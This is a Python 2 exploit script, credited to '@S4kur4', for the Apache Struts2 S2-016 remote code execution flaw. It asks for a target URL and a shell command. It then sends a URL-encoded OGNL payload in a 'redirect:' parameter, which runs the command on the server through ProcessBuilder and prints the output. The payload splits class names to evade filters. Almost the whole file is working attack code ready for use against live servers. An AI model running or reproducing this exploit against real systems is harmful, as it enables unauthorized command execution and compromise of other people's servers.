#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Strutrs2-016(GET) RCE exp
__author__ = '@S4kur4'
logo = "   _____ _              _       ___  \n"\
       "  / ____| |            | |     |__ \ \n"\
       " | (___ | |_ _ __ _   _| |_ ___   ) |\n"\
       "  \___ \| __| '__| | | | __/ __| / / \n"\
       "  ____) | |_| |  | |_| | |_\__ \/ /_ \n"\
       " |_____/ \__|_|   \__,_|\__|___/____|EXP\n"\
       "                                       "

import urllib
import urllib2
import sys
import optparse

data = []

header = {
    "User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Connection" : "keep-alive",
    "Accept" : "*/*",
    "Accept-Encoding" : "deflate",
    "Accept-Language" : "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4"
    }

def main():
    print logo
    parser = optparse.OptionParser('usage: %prog [options]')
    parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
    (options, args) = parser.parse_args()
    if options.target_url==None:
        parser.print_help()
        sys.exit(0)
    else:
        target_url = options.target_url
    target_url = target_url.rstrip('/')
    command = raw_input("Input command:")
    target_url = target_url +"?redirect:${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java.util.Scanner((new%20java.lang.ProcessBuilder(%27"+urllib.quote(command)+"%27.toString().split(%27\\\\s%27))).start().getInputStream()).useDelimiter(%27\\\\AAAA%27),%23str%3d%23s.hasNext()?%23s.next():%27%27,%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().println(%23str),%23resp.getWriter().flush(),%23resp.getWriter().close()}"
    try:
        request = urllib2.Request(url=target_url, headers=header)
        response = urllib2.urlopen(request)
        print response.read()
    except Exception, e:
        print "\033[1;31m[-] Unsuccessful,maybe invulnerable.\033[0m"

if __name__ == '__main__':
    main()